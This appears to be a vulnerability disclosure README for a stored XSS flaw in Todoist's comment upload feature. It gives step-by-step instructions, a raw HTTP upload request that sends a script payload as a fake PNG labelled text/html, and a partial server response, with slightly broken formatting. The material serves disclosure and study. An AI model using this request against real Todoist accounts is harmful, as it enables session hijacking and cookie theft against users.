# Todoist-XSSv9541

# Stored XSS in Todoist via Malicious PNG Upload with Forced Content-Type: text/html

## Short Title
Stored XSS in Todoist via Malicious PNG Upload with Forced Content-Type: text/html

## Affected Product
Todoist Web Application — https://app.todoist.com (comment / upload functionality)

## Summary
When PNG files uploaded to Todoist comments are sent with the Content-Type header set to `text/html`, the uploaded file content may be processed as HTML/JavaScript causing a Stored Cross-Site Scripting (XSS) vulnerability. This can lead to session hijacking, theft of cookies, or unauthorized actions performed on behalf of users.

## Proof of Concept (PoC) — High-Level Steps
> Note: Before publishing any exploit code publicly, it is recommended to coordinate disclosure with the vendor.

1. Prepare a payload containing malicious HTML/JavaScript:
   - Example payload: `<script>alert('XSS by BRT')</script>`
   - Save the content to a file and change the extension to `.png` (e.g., `malicious.png`).

2. Send the file with multipart/form-data to the upload endpoint (e.g., POST /asl/v1/uploads or /api/v1/uploads). Crucially, set the form-data part's `Content-Type` to `text/html`.

3. The server accepts the file and returns a URL (CloudFront).

4. When the uploaded file is embedded in a comment or the returned URL is opened in a browser, the JavaScript executes (Stored XSS).

## Example HTTP Request (PoC format)
![1](https://github.com/user-attachments/assets/933b636c-298f-4e1e-be65-215ef227b9c0)

```![2](https://github.com/user-attachments/assets/7a3f0b3a-f834-4746-9eef-da855526d07b)

POST /asl/v1/uploads HTTP/2
Host: app.todoist.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="malicious.png"
Content-Type: text/html

<script>alert('XSS by BRT')</script>
------WebKitFormBoundary...
```

Example partial server response (JSON):

![2](https://github.com/user-attachments/assets/7082d91f-95a3-4d3e-b28d-1b09219d3b27)


  "file_name": "pngtoxss.png",
  "file_size": 11803,
  "file_type": "text/html",
  "image": "https://.../as/file.png",
  "resource_type": "image"
}

![3](https://github.com/user-attachments/assets/49082c83-63a0-41da-8370-2d62c8b55d92)


